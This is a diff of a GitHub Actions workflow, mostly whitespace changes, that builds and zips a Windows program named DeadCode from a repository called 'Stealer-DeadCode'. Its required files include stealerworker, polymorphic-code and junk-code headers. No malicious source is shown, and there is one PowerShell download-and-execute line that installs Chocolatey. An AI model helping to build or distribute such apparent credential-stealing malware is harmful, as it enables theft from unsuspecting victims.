@@ -20,250 +20,299 @@ jobs:
     timeout-minutes: 120
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          path: Stealer-DeadCode
-          fetch-depth: 0
+    - name: Checkout repository
+      uses: actions/checkout@v4
+      with:
+        path: Stealer-DeadCode
+        fetch-depth: 0
 
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.12'
+    - name: Setup Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.12'
 
-      - name: Setup Chocolatey
-        run: |
-          Write-Host "Checking for Chocolatey installation..."
-          if (Test-Path "C:\ProgramData\Chocolatey\bin\choco.exe") {
-            Write-Host "Chocolatey already installed."
-            choco --version
-          } else {
-            Write-Host "Installing Chocolatey..."
-            Set-ExecutionPolicy Bypass -Scope Process -Force
-            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-            iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
-            if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
-              Write-Host "Error: Chocolatey setup failed"
-              exit 1
-            }
-          }
-          $env:Path = "C:/ProgramData/Chocolatey/bin;" + $env:Path
-        shell: powershell
-
-      - name: Install 7-Zip
-        run: |
-          Write-Host "Installing 7-Zip..."
-          choco install 7zip -y --force --no-progress
+    - name: Setup Chocolatey
+      run: |
+        Write-Host "Checking for Chocolatey installation..."
+        if (Test-Path "C:\ProgramData\Chocolatey\bin\choco.exe") {
+          Write-Host "Chocolatey already installed."
+          choco --version
+        } else {
+          Write-Host "Installing Chocolatey..."
+          Set-ExecutionPolicy Bypass -Scope Process -Force
+          [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+          iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
           if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
-            Write-Host "Error: Failed to install 7-Zip"
+            Write-Host "Error: Chocolatey setup failed"
             exit 1
           }
-          $env:Path = "C:/Program Files/7-Zip;" + $env:Path
-        shell: powershell
+        }
+        $env:Path = "C:/ProgramData/Chocolatey/bin;" + $env:Path
+      shell: powershell
 
-      - name: Cache Qt
-        id: cache-qt
-        uses: actions/cache@v4
-        with:
-          path: C:/Qt
-          key: qt-${{ env.QT_VERSION }}-${{ runner.os }}-win64_mingw-${{ github.event.inputs.cache-buster || '8' }}
-          restore-keys: |
-            qt-${{ env.QT_VERSION }}-${{ runner.os }}-win64_mingw-
+    - name: Install 7-Zip
+      run: |
+        Write-Host "Installing 7-Zip..."
+        choco install 7zip -y --force --no-progress
+        if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
+          Write-Host "Error: Failed to install 7-Zip"
+          exit 1
+        }
+        $env:Path = "C:/Program Files/7-Zip;" + $env:Path
+      shell: powershell
 
-      - name: Install Qt 6.5.3 and MinGW
-        if: steps.cache-qt.outputs.cache-hit != 'true'
-        run: |
-          Write-Host "Installing aqtinstall..."
-          python -m pip install aqtinstall==3.1.18
-          Write-Host "Installing Qt 6.5.3..."
+    - name: Cache Qt
+      id: cache-qt
+      uses: actions/cache@v4
+      with:
+        path: C:/Qt
+        key: qt-${{ env.QT_VERSION }}-${{ runner.os }}-win64_mingw-${{ github.event.inputs.cache-buster || '8' }}
+        restore-keys: |
+          qt-${{ env.QT_VERSION }}-${{ runner.os }}-win64_mingw-
+
+    - name: Install Qt 6.5.3 and MinGW
+      if: steps.cache-qt.outputs.cache-hit != 'true'
+      run: |
+        Write-Host "Installing aqtinstall..."
+        python -m pip install aqtinstall==3.1.18
+        Write-Host "Installing Qt 6.5.3..."
+        python -m aqt install-qt windows desktop 6.5.3 win64_mingw -O C:/Qt --archives qtbase qttools qtsql qtnetwork --timeout 60
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: Failed to install Qt, retrying..."
           python -m aqt install-qt windows desktop 6.5.3 win64_mingw -O C:/Qt --archives qtbase qttools qtsql qtnetwork --timeout 60
           if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: Failed to install Qt, retrying..."
-            python -m aqt install-qt windows desktop 6.5.3 win64_mingw -O C:/Qt --archives qtbase qttools qtsql qtnetwork --timeout 60
-            if ($LASTEXITCODE -ne 0) {
-              Write-Host "Error: Failed to install Qt after retry"
-              exit 1
-            }
-          }
-          Write-Host "Installing MinGW via Chocolatey..."
-          choco install mingw -y --force --version 13.2.0
-          if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
-            Write-Host "Error: Failed to install MinGW via Chocolatey"
+            Write-Host "Error: Failed to install Qt after retry"
             exit 1
           }
-          Write-Host "MinGW installed. Checking g++ version:"
-          & "C:/ProgramData/mingw64/mingw64/bin/g++.exe" --version
-        shell: powershell
+        }
+        Write-Host "Installing MinGW via Chocolatey..."
+        choco install mingw -y --force --version 13.2.0
+        if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 3010) {
+          Write-Host "Error: Failed to install MinGW via Chocolatey"
+          exit 1
+        }
+        Write-Host "MinGW installed. Checking g++ version:"
+        & "C:/ProgramData/mingw64/mingw64/bin/g++.exe" --version
+      shell: powershell
 
-      - name: Verify Qt and MinGW
-        run: |
-          Write-Host "Verifying Qt and MinGW..."
-          $qtVersion = "${{ env.QT_VERSION }}"
-          $paths = @(
-            "C:/Qt/$qtVersion/mingw_64/bin/qmake.exe",
-            "C:/Qt/$qtVersion/mingw_64/bin/uic.exe",
-            "C:/Qt/$qtVersion/mingw_64/bin/windeployqt.exe",
-            "C:/Qt/$qtVersion/mingw_64/bin/moc.exe",
-            "C:/ProgramData/mingw64/mingw64/bin/g++.exe",
-            "C:/ProgramData/mingw64/mingw64/bin/mingw32-make.exe",
-            "C:/Qt/$qtVersion/mingw_64/bin/Qt6Core.dll",
-            "C:/Qt/$qtVersion/mingw_64/bin/Qt6Gui.dll",
-            "C:/Qt/$qtVersion/mingw_64/bin/Qt6Widgets.dll",
-            "C:/Qt/$qtVersion/mingw_64/bin/Qt6Network.dll",
-            "C:/Qt/$qtVersion/mingw_64/bin/Qt6Sql.dll"
-          )
-          foreach ($path in $paths) {
-            if (-not (Test-Path $path)) {
-              Write-Host "Error: $path not found"
-              exit 1
-            }
+    - name: Verify Qt and MinGW
+      run: |
+        Write-Host "Verifying Qt and MinGW..."
+        $qtVersion = "${{ env.QT_VERSION }}"
+        $paths = @(
+          "C:/Qt/$qtVersion/mingw_64/bin/qmake.exe",
+          "C:/Qt/$qtVersion/mingw_64/bin/uic.exe",
+          "C:/Qt/$qtVersion/mingw_64/bin/windeployqt.exe",
+          "C:/Qt/$qtVersion/mingw_64/bin/moc.exe",
+          "C:/ProgramData/mingw64/mingw64/bin/g++.exe",
+          "C:/ProgramData/mingw64/mingw64/bin/mingw32-make.exe",
+          "C:/Qt/$qtVersion/mingw_64/bin/Qt6Core.dll",
+          "C:/Qt/$qtVersion/mingw_64/bin/Qt6Gui.dll",
+          "C:/Qt/$qtVersion/mingw_64/bin/Qt6Widgets.dll",
+          "C:/Qt/$qtVersion/mingw_64/bin/Qt6Network.dll",
+          "C:/Qt/$qtVersion/mingw_64/bin/Qt6Sql.dll"
+        )
+        foreach ($path in $paths) {
+          if (-not (Test-Path $path)) {
+            Write-Host "Error: $path not found"
+            exit 1
           }
-          $env:Path = "C:/Qt/$qtVersion/mingw_64/bin;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
-          qmake --version
+        }
+        $env:Path = "C:/Qt/$qtVersion/mingw_64/bin;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
+        qmake --version
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: qmake failed"
+          exit 1
+        }
+        & "C:/ProgramData/mingw64/mingw64/bin/g++.exe" --version
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: g++ failed"
+          exit 1
+        }
+      shell: powershell
+
+    - name: Cache vcpkg
+      uses: actions/cache@v4
+      with:
+        path: |
+          C:/vcpkg
+          C:/vcpkg/installed
+        key: vcpkg-${{ env.VCPKG_COMMIT }}-${{ github.event.inputs.cache-buster || '8' }}
+        restore-keys: |
+          vcpkg-${{ env.VCPKG_COMMIT }}-
+
+    - name: Setup vcpkg
+      run: |
+        Write-Host "Setting up vcpkg..."
+        if (-not (Test-Path C:/vcpkg)) {
+          git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
           if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: qmake failed"
+            Write-Host "Error: Failed to clone vcpkg"
             exit 1
           }
-          & "C:/ProgramData/mingw64/mingw64/bin/g++.exe" --version
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: g++ failed"
-            exit 1
-          }
-        shell: powershell
+        }
+        Set-Location C:/vcpkg
+        if ("${{ env.VCPKG_COMMIT }}" -ne "latest") {
+          git checkout ${{ env.VCPKG_COMMIT }}
+        } else {
+          git pull origin master
+        }
+        ./bootstrap-vcpkg.bat -disableMetrics
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: Bootstrap failed"
+          exit 1
+        }
+      shell: powershell
 
-      - name: Cache vcpkg
-        uses: actions/cache@v4
-        with:
-          path: |
-            C:/vcpkg
-            C:/vcpkg/installed
-          key: vcpkg-${{ env.VCPKG_COMMIT }}-${{ github.event.inputs.cache-buster || '8' }}
-          restore-keys: |
-            vcpkg-${{ env.VCPKG_COMMIT }}-
+    - name: Install vcpkg dependencies
+      run: |
+        Set-Location C:/vcpkg
+        Write-Host "Installing vcpkg dependencies..."
+        ./vcpkg.exe install sqlite3[core,json1]:x64-mingw-dynamic curl:x64-mingw-dynamic openssl:x64-mingw-dynamic libzip:x64-mingw-dynamic bzip2:x64-mingw-dynamic zlib:x64-mingw-dynamic --triplet x64-mingw-dynamic --clean-after-build
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: Failed to install dependencies"
+          Get-ChildItem -Path ./logs -Recurse | Get-Content
+          exit 1
+        }
+      shell: powershell
 
-      - name: Setup vcpkg
-        run: |
-          Write-Host "Setting up vcpkg..."
-          if (-not (Test-Path C:/vcpkg)) {
-            git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
-            if ($LASTEXITCODE -ne 0) {
-              Write-Host "Error: Failed to clone vcpkg"
+    - name: Verify project structure
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
+        $requiredFiles = @(
+          "ui/DeadCode.pro",
+          "src/main.cpp",
+          "ui/mainwindow.ui",
+          "ui/mainwindow.cpp",
+          "ui/mainwindow.h",
+          "src/build_key.h",
+          "src/polymorphic_code.h",
+          "src/junk_code.h",
+          "src/stealerworker.h",
+          "icon.rc",
+          "icon.ico"
+        )
+        $missingFiles = $requiredFiles | Where-Object { -not (Test-Path $_) }
+        if ($missingFiles) {
+          Write-Host "Error: Missing files: $missingFiles"
+          exit 1
+        }
+        if (-not (Test-Path "config.json")) {
+          Write-Host "Creating stub config.json..."
+          Set-Content -Path "config.json" -Value "{}"
+        }
+        Write-Host "Project structure verified"
+      shell: powershell
+
+    - name: Debug directory structure
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
+        Write-Host "Current directory: $(Get-Location)"
+        Write-Host "Listing files in repository:"
+        Get-ChildItem -Recurse | ForEach-Object { Write-Host $_.FullName }
+      shell: powershell
+
+    - name: Fix encoding of source files
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
+        Write-Host "Fixing encoding of source files..."
+        $files = @("src/main.cpp", "ui/mainwindow.cpp", "ui/mainwindow.h", "src/stealerworker.h", "icon.rc")
+        foreach ($file in $files) {
+          $fullPath = Join-Path -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode -ChildPath $file
+          if (Test-Path $fullPath) {
+            Write-Host "Processing $file..."
+            try {
+              $content = Get-Content -Path $fullPath -Raw -Encoding UTF8 -ErrorAction Stop
+              $content = $content -replace "\r\n", "`n"
+              $content = $content -replace "// ÐŸÑ€Ð¾ÑÑ‚Ñ€Ð°Ð½ÑÑ‚Ð²Ð¾ Ð¸Ð¼Ñ‘Ð½ Ð´Ð»Ñ filesystem", "// Пространство имён для filesystem"
+              [System.IO.File]::WriteAllText($fullPath, $content, [System.Text.UTF8Encoding]::new($false))
+              Write-Host "Fixed encoding for $file to UTF-8 without BOM"
+            } catch {
+              Write-Host "Error processing $file : $_"
               exit 1
             }
-          }
-          Set-Location C:/vcpkg
-          if ("${{ env.VCPKG_COMMIT }}" -ne "latest") {
-            git checkout ${{ env.VCPKG_COMMIT }}
           } else {
-            git pull origin master
+            Write-Host "Error: $file not found at $fullPath"
+            exit 1
           }
-          ./bootstrap-vcpkg.bat -disableMetrics
+        }
+      shell: powershell
+
+    - name: Configure and build
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
+        Write-Host "Current directory: $PWD"
+        Write-Host "Listing files in repository:"
+        Get-ChildItem -Recurse | ForEach-Object { $_.FullName }
+        Write-Host "Checking for critical headers..."
+        $headers = @(
+          "C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include/winsock2.h",
+          "C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include/iphlpapi.h",
+          "C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include/gdiplus/gdiplus.h",
+          "C:/vcpkg/installed/x64-mingw-dynamic/include/sqlite3.h",
+          "C:/vcpkg/installed/x64-mingw-dynamic/include/curl/curl.h",
+          "C:/vcpkg/installed/x64-mingw-dynamic/include/openssl/evp.h"
+        )
+        foreach ($header in $headers) {
+          if (Test-Path $header) {
+            Write-Host "$header found"
+          } else {
+            Write-Host "Error: $header not found"
+            exit 1
+          }
+        }
+        Write-Host "Verifying encoding of source files..."
+        $files = @("src/main.cpp", "ui/mainwindow.cpp", "ui/mainwindow.h", "src/stealerworker.h", "icon.rc")
+        foreach ($file in $files) {
+          $content = Get-Content -Path $file -Raw -Encoding Byte
+          if ($content[0] -eq 0xEF -and $content[1] -eq 0xBB -and $content[2] -eq 0xBF) {
+            Write-Host "Error: $file has UTF-8 BOM"
+            exit 1
+          } else {
+            Write-Host "$file encoding is correct (UTF-8 without BOM)"
+          }
+        }
+        Write-Host "Printing lines 40-60 of ui/mainwindow.cpp..."
+        Get-Content -Path "ui/mainwindow.cpp" | Select-Object -Index (39..59)
+        $env:Path = "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
+        $env:VCPKG_ROOT = "C:/vcpkg"
+        $env:INCLUDE = "C:/vcpkg/installed/x64-mingw-dynamic/include;C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include;" + $env:INCLUDE
+        $env:LIB = "C:/vcpkg/installed/x64-mingw-dynamic/lib;C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/lib;" + $env:LIB
+        $env:TEMP = "C:/Temp"
+        $env:TMP = "C:/Temp"
+        New-Item -Path "C:/Temp" -ItemType Directory -Force
+        $buildDate = Get-Date -Format "yyyy-MM-dd"
+        $buildVersion = git rev-parse --short HEAD
+        if (-not $buildVersion) { $buildVersion = "unknown" }
+        New-Item -Path "build" -ItemType Directory -Force
+        Set-Location build
+        Write-Host "Running qmake with command:"
+        $qmakeCmd = "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin/qmake.exe ../ui/DeadCode.pro CONFIG+=release QMAKE_INCDIR+=C:/vcpkg/installed/x64-mingw-dynamic/include QMAKE_LIBDIR+=C:/vcpkg/installed/x64-mingw-dynamic/lib DEFINES+=\"BUILD_DATE=$buildDate\" DEFINES+=\"BUILD_VERSION=$buildVersion\""
+        Write-Host $qmakeCmd
+        Invoke-Expression $qmakeCmd
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: qmake failed"
+          exit 1
+        }
+        Write-Host "Running mingw32-make with verbose output..."
+        $makeCmd = "C:/ProgramData/mingw64/mingw64/bin/mingw32-make.exe -f Makefile.Release -j4 VERBOSE=1"
+        Write-Host "Make command: $makeCmd"
+        try {
+          Invoke-Expression "$makeCmd 2>&1 | Tee-Object -FilePath make.log"
           if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: Bootstrap failed"
+            Write-Host "Error: mingw32-make failed. Full log:"
+            Get-Content -Path make.log -Raw
             exit 1
           }
-        shell: powershell
-
-      - name: Install vcpkg dependencies
-        run: |
-          Set-Location C:/vcpkg
-          Write-Host "Installing vcpkg dependencies..."
-          ./vcpkg.exe install sqlite3[core,json1]:x64-mingw-dynamic curl:x64-mingw-dynamic openssl:x64-mingw-dynamic libzip:x64-mingw-dynamic bzip2:x64-mingw-dynamic zlib:x64-mingw-dynamic --triplet x64-mingw-dynamic --clean-after-build
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: Failed to install dependencies"
-            Get-ChildItem -Path ./logs -Recurse | Get-Content
-            exit 1
-          }
-        shell: powershell
-
-      - name: Verify project structure
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
-          $requiredFiles = @(
-            "ui/DeadCode.pro",
-            "src/main.cpp",
-            "ui/mainwindow.ui",
-            "ui/mainwindow.cpp",
-            "ui/mainwindow.h",
-            "src/build_key.h",
-            "src/polymorphic_code.h",
-            "src/junk_code.h",
-            "src/stealerworker.h",
-            "icon.rc",
-            "icon.ico"
-          )
-          $missingFiles = $requiredFiles | Where-Object { -not (Test-Path $_) }
-          if ($missingFiles) {
-            Write-Host "Error: Missing files: $missingFiles"
-            exit 1
-          }
-          if (-not (Test-Path "config.json")) {
-            Write-Host "Creating stub config.json..."
-            Set-Content -Path "config.json" -Value "{}"
-          }
-          Write-Host "Project structure verified"
-        shell: powershell
-
-      - name: Debug directory structure
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
-          Write-Host "Current directory: $(Get-Location)"
-          Write-Host "Listing files in repository:"
-          Get-ChildItem -Recurse | ForEach-Object { Write-Host $_.FullName }
-        shell: powershell
-
-      - name: Fix encoding of source files
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
-          Write-Host "Fixing encoding of source files..."
-          $files = @("src/main.cpp", "ui/mainwindow.cpp", "ui/mainwindow.h", "src/stealerworker.h", "icon.rc")
-          foreach ($file in $files) {
-            $fullPath = Join-Path -Path $env:GITHUB_WORKSPACE/Stealer-DeadCode -ChildPath $file
-            if (Test-Path $fullPath) {
-              Write-Host "Processing $file..."
-              try {
-                $content = Get-Content -Path $fullPath -Raw -Encoding UTF8 -ErrorAction Stop
-                $content = $content -replace "\r\n", "`n"
-                $content = $content -replace "// ÐŸÑ€Ð¾ÑÑ‚Ñ€Ð°Ð½ÑÑ‚Ð²Ð¾ Ð¸Ð¼Ñ‘Ð½ Ð´Ð»Ñ filesystem", "// Пространство имён для filesystem"
-                [System.IO.File]::WriteAllText($fullPath, $content, [System.Text.UTF8Encoding]::new($false))
-                Write-Host "Fixed encoding for $file to UTF-8 without BOM"
-              } catch {
-                Write-Host "Error processing $file : $_"
-                exit 1
-              }
-            } else {
-              Write-Host "Error: $file not found at $fullPath"
-              exit 1
-            }
-          }
-        shell: powershell
-
-      - name: Configure and build
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
-          Write-Host "Current directory: $PWD"
-          Write-Host "Listing files in repository:"
-          Get-ChildItem -Recurse | ForEach-Object { $_.FullName }
-          Write-Host "Checking for critical headers..."
-          $headers = @(
-            "C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include/winsock2.h",
-            "C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include/iphlpapi.h",
-            "C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include/gdiplus/gdiplus.h",
-            "C:/vcpkg/installed/x64-mingw-dynamic/include/sqlite3.h",
-            "C:/vcpkg/installed/x64-mingw-dynamic/include/curl/curl.h",
-            "C:/vcpkg/installed/x64-mingw-dynamic/include/openssl/evp.h"
-          )
-          foreach ($header in $headers) {
-            if (Test-Path $header) {
-              Write-Host "$header found"
-            } else {
-              Write-Host "Error: $header not found"
-              exit 1
-            }
-          }
-          Write-Host "Verifying encoding of source files..."
-          $files = @("src/main.cpp", "ui/mainwindow.cpp", "ui/mainwindow.h", "src/stealerworker.h", "icon.rc")
-          foreach ($file in $files) {
+        } catch {
+          Write-Host "Error: mingw32-make threw an exception: $_"
+          Get-Content -Path make.log -Raw
+          exit 1
+        }
+        Write-Host "Verifying encoding of generated files..."
+        $generatedFiles = @("release/ui/ui_mainwindow.h", "release/moc/moc_mainwindow.cpp", "release/moc/moc_stealerworker.cpp")
+        foreach ($file in $generatedFiles) {
+          if (Test-Path $file) {
             $content = Get-Content -Path $file -Raw -Encoding Byte
             if ($content[0] -eq 0xEF -and $content[1] -eq 0xBB -and $content[2] -eq 0xBF) {
               Write-Host "Error: $file has UTF-8 BOM"
@@ -272,194 +321,145 @@ jobs:
               Write-Host "$file encoding is correct (UTF-8 without BOM)"
             }
           }
-          Write-Host "Printing lines 40-60 of ui/mainwindow.cpp..."
-          Get-Content -Path "ui/mainwindow.cpp" | Select-Object -Index (39..59)
-          $env:Path = "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
-          $env:VCPKG_ROOT = "C:/vcpkg"
-          $env:INCLUDE = "C:/vcpkg/installed/x64-mingw-dynamic/include;C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/include;" + $env:INCLUDE
-          $env:LIB = "C:/vcpkg/installed/x64-mingw-dynamic/lib;C:/ProgramData/mingw64/mingw64/x86_64-w64-mingw32/lib;" + $env:LIB
-          $env:TEMP = "C:/Temp"
-          $env:TMP = "C:/Temp"
-          New-Item -Path "C:/Temp" -ItemType Directory -Force
-          $buildDate = Get-Date -Format "yyyy-MM-dd"
-          $buildVersion = git rev-parse --short HEAD
-          if (-not $buildVersion) { $buildVersion = "unknown" }
-          New-Item -Path "build" -ItemType Directory -Force
-          Set-Location build
-          Write-Host "Running qmake with command:"
-          $qmakeCmd = "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin/qmake.exe ../ui/DeadCode.pro CONFIG+=release QMAKE_INCDIR+=C:/vcpkg/installed/x64-mingw-dynamic/include QMAKE_LIBDIR+=C:/vcpkg/installed/x64-mingw-dynamic/lib DEFINES+=\"BUILD_DATE=$buildDate\" DEFINES+=\"BUILD_VERSION=$buildVersion\""
-          Write-Host $qmakeCmd
-          Invoke-Expression $qmakeCmd
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: qmake failed"
-            exit 1
+        }
+        if (-not (Test-Path release/DeadCode.exe)) {
+          Write-Host "Error: DeadCode.exe not found"
+          exit 1
+        }
+        Write-Host "Build completed"
+      shell: powershell
+
+    - name: Upload make log on failure
+      if: failure()
+      uses: actions/upload-artifact@v4
+      with:
+        name: make-log
+        path: $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/make.log
+
+    - name: Debug Makefile
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build
+        Write-Host "Contents of Makefile.Release:"
+        Get-Content -Path Makefile.Release -ErrorAction SilentlyContinue
+      shell: powershell
+
+    - name: Deploy Qt dependencies
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/release
+        $env:Path = "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
+        Write-Host "Running windeployqt..."
+        & "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin/windeployqt.exe" DeadCode.exe --release --no-translations --no-opengl-sw --no-system-d3d-compiler
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: windeployqt failed"
+          exit 1
+        }
+        Write-Host "Qt dependencies deployed"
+      shell: powershell
+
+    - name: Copy vcpkg and system dependencies
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/release
+        $vcpkgBinDir = "C:/vcpkg/installed/x64-mingw-dynamic/bin"
+        $system32Dir = "C:/Windows/System32"
+        $dlls = @(
+          "sqlite3.dll",
+          "libcurl-4.dll",
+          "libssl-3-x64.dll",
+          "libcrypto-3-x64.dll",
+          "libzip.dll",
+          "zlib1.dll",
+          "libbz2.dll",
+          "libssh2-1.dll",
+          "nghttp2.dll",
+          "libzstd.dll",
+          "libbrotlicommon.dll",
+          "libbrotlidec.dll",
+          "libbrotlienc.dll",
+          "gdiplus.dll"
+        )
+        foreach ($dll in $dlls) {
+          if ($dll -eq "gdiplus.dll") {
+            $sourceDir = $system32Dir
+          } else {
+            $sourceDir = $vcpkgBinDir
           }
-          Write-Host "Running mingw32-make with verbose output..."
-          $makeCmd = "C:/ProgramData/mingw64/mingw64/bin/mingw32-make.exe -f Makefile.Release -j4 VERBOSE=1"
-          Write-Host "Make command: $makeCmd"
-          try {
-            Invoke-Expression "$makeCmd 2>&1 | Tee-Object -FilePath make.log"
-            if ($LASTEXITCODE -ne 0) {
-              Write-Host "Error: mingw32-make failed. Full log:"
-              Get-Content -Path make.log -Raw
-              exit 1
-            }
-          } catch {
-            Write-Host "Error: mingw32-make threw an exception: $_"
-            Get-Content -Path make.log -Raw
-            exit 1
+          if (Test-Path "$sourceDir/$dll") {
+            Copy-Item -Path "$sourceDir/$dll" -Destination .
+            Write-Host "Copied $dll"
+          } else {
+            Write-Host "Warning: $dll not found in $sourceDir"
           }
-          Write-Host "Verifying encoding of generated files..."
-          $generatedFiles = @("release/ui/ui_mainwindow.h", "release/moc/moc_mainwindow.cpp", "release/moc/moc_stealerworker.cpp")
-          foreach ($file in $generatedFiles) {
-            if (Test-Path $file) {
-              $content = Get-Content -Path $file -Raw -Encoding Byte
-              if ($content[0] -eq 0xEF -and $content[1] -eq 0xBB -and $content[2] -eq 0xBF) {
-                Write-Host "Error: $file has UTF-8 BOM"
-                exit 1
-              } else {
-                Write-Host "$file encoding is correct (UTF-8 without BOM)"
-              }
-            }
-          }
-          if (-not (Test-Path release/DeadCode.exe)) {
-            Write-Host "Error: DeadCode.exe not found"
-            exit 1
-          }
-          Write-Host "Build completed"
-        shell: powershell
+        }
+        Write-Host "Dependencies copied"
+      shell: powershell
 
-      - name: Upload make log on failure
-        if: failure()
-        uses: actions/upload-artifact@v4
-        with:
-          name: make-log
-          path: $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/make.log
+    - name: Copy additional files
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode
+        Copy-Item -Path "config.json" -Destination "build/release/" -Force
+        Copy-Item -Path "icon.ico" -Destination "build/release/" -Force
+        New-Item -Path "build/release/data" -ItemType Directory -Force
+        Write-Host "Additional files copied"
+      shell: powershell
 
-      - name: Debug Makefile
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build
-          Write-Host "Contents of Makefile.Release:"
-          Get-Content -Path Makefile.Release -ErrorAction SilentlyContinue
-        shell: powershell
+    - name: Verify all files
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/release
+        $requiredFiles = @(
+          "DeadCode.exe",
+          "Qt6Core.dll",
+          "Qt6Gui.dll",
+          "Qt6Widgets.dll",
+          "Qt6Network.dll",
+          "Qt6Sql.dll",
+          "sqlite3.dll",
+          "libcurl-4.dll",
+          "libssl-3-x64.dll",
+          "libcrypto-3-x64.dll",
+          "libzip.dll",
+          "zlib1.dll",
+          "libbz2.dll",
+          "libssh2-1.dll",
+          "nghttp2.dll",
+          "libzstd.dll",
+          "libbrotlicommon.dll",
+          "libbrotlidec.dll",
+          "libbrotlienc.dll",
+          "gdiplus.dll",
+          "plugins/platforms/qwindows.dll",
+          "plugins/sqldrivers/qsqlite.dll",
+          "config.json",
+          "icon.ico",
+          "data"
+        )
+        $missingFiles = $requiredFiles | Where-Object { -not (Test-Path $_) }
+        if ($missingFiles) {
+          Write-Host "Error: Missing files: $missingFiles"
+          exit 1
+        }
+        Write-Host "All required files present"
+      shell: powershell
 
-      - name: Deploy Qt dependencies
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/release
-          $env:Path = "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin;C:/ProgramData/mingw64/mingw64/bin;" + $env:Path
-          Write-Host "Running windeployqt..."
-          & "C:/Qt/${{ env.QT_VERSION }}/mingw_64/bin/windeployqt.exe" DeadCode.exe --release --no-translations --no-opengl-sw --no-system-d3d-compiler
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "Error: windeployqt failed"
-            exit 1
-          }
-          Write-Host "Qt dependencies deployed"
-        shell: powershell
+    - name: Create artifact
+      run: |
+        Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build
+        & "C:/Program Files/7-Zip/7z.exe" a DeadCode-Portable.zip ./release/*
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: Failed to create zip archive"
+          exit 1
+        }
+      shell: powershell
 
-      - name: Copy vcpkg and system dependencies
-        run: |
-          Set-Location $env:GITHUB_WORKSPACE/Stealer-DeadCode/build/release
-          $vcpkgBinDir = "C:/vcpkg/installed/x64-mingw-dynamic/bin"
-          $system32Dir = "C:/Windows/System32"
-          $dlls = @(
-            "sqlite3.dll",
-            "libcurl-4.dll",
-            "libssl-3-x64.dll",
-            "libcrypto-3-x64.dll",
-            "libzip.dll",
-            "zlib1.dll",
-            "libbz2.dll",
-            "libssh2-1.dll",
-            "nghttp2.dll",
-            "libzstd.dll",
-            "libbrotlicommon.dll",
-            "libbrotlidec.dll",
-            "libbrotlienc.dll",
-            "gdiplus.dll"
-          )
